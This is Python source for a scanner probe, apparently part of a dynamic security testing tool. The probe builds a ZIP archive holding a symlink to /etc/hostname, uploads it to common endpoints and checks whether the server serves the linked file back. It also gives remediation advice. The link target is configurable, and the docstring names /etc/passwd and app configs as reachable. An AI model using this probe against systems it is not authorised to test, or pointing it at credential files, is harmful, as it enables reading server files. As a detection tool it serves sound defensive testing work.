#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
File upload: ZIP archive containing a symlink, extracted by the
server, dereferences the symlink target on serve-back.

Many archive extractors (Python's `zipfile.extractall` does NOT do
this, but `unzip` does, and a number of plug-ins / Java
`ZipInputStream` consumers do) will create symlink entries from a
ZIP. If the symlink points outside the unpack directory and the
server then serves the unpacked tree from the web root, the symlink's
target leaks — `/etc/hostname`, `/etc/passwd`, app configs.

The probe builds a small ZIP with a single symlink entry pointing at
`/etc/hostname` (the smallest, lowest-impact canonical Linux file —
hostname is one short identifier line, not sensitive PII). After
upload, we attempt to fetch the entry's published name and check the
served body matches a hostname-like single-line string. We never test
against `/etc/passwd` here — the zipslip probe (#45) handles its own
canary; symlink-deref-of-passwd would just duplicate it.

Detection criteria — ALL must be true for validated=True:
  (a) upload returned 2xx,
  (b) we can fetch the entry name same-origin and got 200 + body, AND
  (c) the body matches the hostname shape (single short token,
      printable, no HTML, length <= 64).

We use `zipfile.ZipInfo` with `external_attr` set to the standard
Unix symlink mode (0o120777 << 16). The "data" of the entry is the
symlink target string, exactly as `unzip` writes it on disk.

Detection signal:
  Upload accepted + fetched-back body is a single-line hostname-shaped
  string consistent with /etc/hostname.
"""
from __future__ import annotations

import io
import re
import secrets
import sys
import zipfile
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

UPLOAD_PATHS = (
    "/file-upload",
    "/upload",
    "/api/upload",
    "/api/file/upload",
    "/api/files",
    "/files/upload",
    "/uploads",
    "/api/import",
)

FETCH_PREFIXES = (
    "/uploads/",
    "/files/",
    "/static/uploads/",
    "/public/uploads/",
    "/upload/",
)

PATH_RE = re.compile(
    r'(?:"(?:path|url|location|file|filename)"\s*:\s*"([^"]+)"|'
    r'<a [^>]*href="([^"]+)")', re.I)

# A printable single-line token between 1 and 64 chars. Linux
# /etc/hostname is exactly this shape (one hostname + newline). HTML
# error pages will NOT match this — they have angle brackets and are
# longer than 64 chars.
HOSTNAME_RE = re.compile(r"^[A-Za-z0-9._\-]{1,64}\s*$")

# Standard Unix symlink mode: S_IFLNK (0120000) + 0777 perms. ZIP
# stores Unix mode in the high 16 bits of external_attr.
SYMLINK_MODE = (0o120777 << 16)


def _hdr(headers: dict, name: str) -> str:
    name_l = name.lower()
    for k, v in headers.items():
        if k.lower() == name_l:
            return v
    return ""


def _build_symlink_zip(entry_name: str, link_target: str) -> bytes:
    """Build an in-memory ZIP whose single entry is a symlink.

    `entry_name`  — the path inside the archive (and on disk after
                    extract). We use a unique r12-* name so the
                    server's namespace stays clean.
    `link_target` — the symlink destination (e.g. /etc/hostname).
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, mode="w",
                         compression=zipfile.ZIP_STORED) as zf:
        zi = zipfile.ZipInfo(entry_name)
        zi.create_system = 3                 # 3 = Unix
        zi.external_attr = SYMLINK_MODE      # mark as symlink
        zf.writestr(zi, link_target)         # data = symlink target
    return buf.getvalue()


def _build_multipart(filename: str, content: bytes,
                     field: str = "file") -> tuple[str, bytes]:
    boundary = "----dast-zipsym-" + secrets.token_hex(8)
    crlf = b"\r\n"
    parts = []
    parts.append(("--" + boundary).encode())
    parts.append(
        f'Content-Disposition: form-data; name="{field}"; '
        f'filename="{filename}"'.encode())
    parts.append(b"Content-Type: application/zip")
    parts.append(b"")
    parts.append(content)
    parts.append(("--" + boundary + "--").encode())
    parts.append(b"")
    return boundary, crlf.join(parts)


class UploadZipSymlinkProbe(Probe):
    name = "upload_zip_symlink"
    summary = ("Detects upload handlers that extract ZIP symlink "
               "entries and serve their dereferenced contents.")
    safety_class = "probe"

    def add_args(self, parser):
        parser.add_argument(
            "--upload-path", action="append", default=[],
            help="Additional upload endpoint to try (repeatable).")
        parser.add_argument(
            "--field", default="file",
            help="Multipart field name (default: file).")
        parser.add_argument(
            "--link-target", default="/etc/hostname",
            help="Symlink target inside the test ZIP (default: "
                 "/etc/hostname). Keep to a low-impact, single-line "
                 "Linux file.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        paths = list(UPLOAD_PATHS) + list(args.upload_path or [])

        # Unique entry name so we can recognise OUR file when it lands.
        stem = secrets.token_hex(4)
        entry_name = f"r12-symlink-{stem}.txt"
        zip_bytes = _build_symlink_zip(entry_name, args.link_target)

        attempts: list[dict] = []
        confirmed: dict | None = None

        for p in paths:
            upload_url = urljoin(origin, p)
            zip_filename = f"r12-{stem}.zip"
            boundary, body = _build_multipart(
                zip_filename, zip_bytes, field=args.field)
            r = client.request("POST", upload_url, headers={
                "Content-Type": (
                    f"multipart/form-data; boundary={boundary}"),
            }, body=body)
            row: dict = {"path": p, "filename": zip_filename,
                         "entry_name": entry_name,
                         "upload_status": r.status, "upload_size": r.size}

            if r.status not in (200, 201, 202, 204):
                attempts.append(row)
                continue

            # Look for the extraction's public path. Many handlers
            # return a list of extracted files in the JSON body.
            location_hdr = _hdr(r.headers, "Location")
            served_path = None
            if location_hdr:
                served_path = location_hdr
            elif entry_name in (r.text or ""):
                served_path = entry_name
            else:
                m = PATH_RE.search(r.text or "")
                if m:
                    served_path = m.group(1) or m.group(2)

            guesses: list[str] = []
            if served_path:
                guesses.append(served_path)
            for prefix in FETCH_PREFIXES[:3]:
                guesses.append(prefix + entry_name)

            row["fetch_targets"] = guesses
            for guess in guesses:
                fetch_url = (guess if guess.startswith(("http://", "https://"))
                             else urljoin(origin, guess))
                if urlparse(fetch_url).netloc and \
                        urlparse(fetch_url).netloc != parsed.netloc:
                    continue
                fr = client.request("GET", fetch_url)
                if fr.status == 200 and fr.body and fr.size <= 256:
                    text = (fr.text or "").strip()
                    if text and HOSTNAME_RE.match(text):
                        row["served_url"] = fetch_url
                        row["served_body_excerpt"] = text[:128]
                        row["confirmed"] = True
                        confirmed = row
                        break
            attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "link_target": args.link_target,
                    "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.92,
                summary=(f"Confirmed: ZIP-with-symlink uploaded to "
                         f"{origin}{confirmed['path']} was extracted "
                         f"and the symlink target ({args.link_target}) "
                         f"is reachable at {confirmed.get('served_url', '?')} — "
                         "the extractor follows symlinks during unpack."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Use an extractor that refuses symlink entries "
                    "outright, or one that resolves entry paths and "
                    "rejects any whose canonical destination escapes "
                    "the unpack directory. Python's `zipfile.extractall` "
                    "is safe from this class; `unzip(1)` with `-X` is "
                    "not. After extraction, walk the unpacked tree and "
                    "drop any symlinks found before the directory is "
                    "exposed to the web server.\n"
                    "Defence in depth: serve uploaded archives' "
                    "contents from a subdirectory the web server "
                    "treats as `Options -FollowSymLinks`."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} ZIP-symlink "
                     f"upload endpoints on {origin}; no symlink target "
                     "content was served back."),
            evidence=evidence,
        )


if __name__ == "__main__":
    UploadZipSymlinkProbe().main()
